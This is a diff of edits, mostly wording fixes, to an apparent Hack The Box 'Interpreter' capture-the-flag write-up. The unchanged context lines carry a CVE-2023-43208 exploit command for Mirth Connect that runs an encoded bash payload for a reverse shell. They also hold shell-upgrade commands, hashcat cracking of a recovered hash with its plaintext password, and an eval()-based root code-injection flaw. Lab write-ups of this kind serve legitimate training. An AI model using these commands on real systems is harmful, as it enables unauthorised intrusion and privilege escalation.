@@ -20,7 +20,7 @@ Interpreter begins with the identification and enumeration of a Mirth Connect in
 
 Post-exploitation enumeration reveals a configuration file containing database credentials. Access to the database allows the recovery of a PBKDF2-SHA256 password hash, which is reformatted and cracked to obtain the SSH password for a system user.
 
-Further enumeration uncovers an internally exposed service running with root privileges. Analysis of the service source code identifies an insecure use of dynamic code evaluation, resulting in a code execution vulnerability. By exploiting this flaw through a locally accessible interface, arbitrary commands are executed in the context of the root-owned process, ultimately leading to full system compromise.
+Further enumeration uncovers an internal service running with root privileges. Analysis of the service script identifies an insecure use of dynamic code evaluation, resulting in a code execution vulnerability. By exploiting this flaw, arbitrary commands are executed in the context of the root-owned process, ultimately leading to full system compromise.
 
 
 # Scanning
@@ -66,9 +66,9 @@ Nmap finds three open ports:
 
 # Enumeration
 
-> **Mirth Connect** is a software tool used mainly in healthcare to connect different systems and allow them to share data with each other
+> **Mirth Connect** is a software tool used mainly in healthcare to connect different systems and allow them to share data with each other.
 
-[This](https://www.huntress.com/threat-library/vulnerabilities/cve-2023-43208?utm_source=chatgpt.com) huntress article shows how to enumerate a Mirth Connect instance in order to find the running software version.
+[This](https://www.huntress.com/threat-library/vulnerabilities/cve-2023-43208?utm_source=chatgpt.com) Huntress article shows how to enumerate a Mirth Connect instance in order to find the running software version.
 
 Using a curl request, version `4.4.0` is discovered.
 
@@ -100,11 +100,11 @@ python3 CVE-2023-43208.py -u https://{TARGET_IP} -c "bash -c {echo,<BASE64_ENCOD
 
 # Initial Foothold
 
-A shell is obtained on the listener
+A shell is obtained on the listener.
 
 ![Interpreter Foothold](/images/HTB-Interpreter/foothold.png)
 
-Our shell can be upgraded with the following commands
+We upgrade it with the following commands:
 ```
 python3 -c 'import pty;pty.spawn("/bin/bash")'  
 export TERM=xterm
@@ -175,12 +175,12 @@ The complete hash is:
 sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=
 ```
 
-The hash is then cracked using hashcat:
+It is then cracked using hashcat:
 ```
 hashcat -m 10900 sedric_hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
-We recover the password:
+The user password is recovered.
 ```
 snowflake1
 ```
@@ -254,7 +254,7 @@ if __name__=="__main__":
     app.run("127.0.0.1",54321, threaded=True)
 ```
 
-The output of `ps aux | grep notif.py` shows that it is running as `root` and uses port `54321`.
+The output of `ps aux | grep notif.py` shows that it is running as `root` and uses port `54321` (the port number is also mentioned in the script).
 
 ![Interpreter processes](/images/HTB-Interpreter/processes.png)
 
@@ -269,6 +269,8 @@ return eval(f"f'''{template}'''")
 ```
 
 Because `first` is inserted into a Python f-string and then evaluated with `eval()`, anything placed inside `{ ... }` in the firstname field becomes executable Python code.
+
+> NOTE: Any parameter inserted into `template` before the `eval()` can be abused, not only `first`.
 
 It only accepts requests from `127.0.0.1`.
 
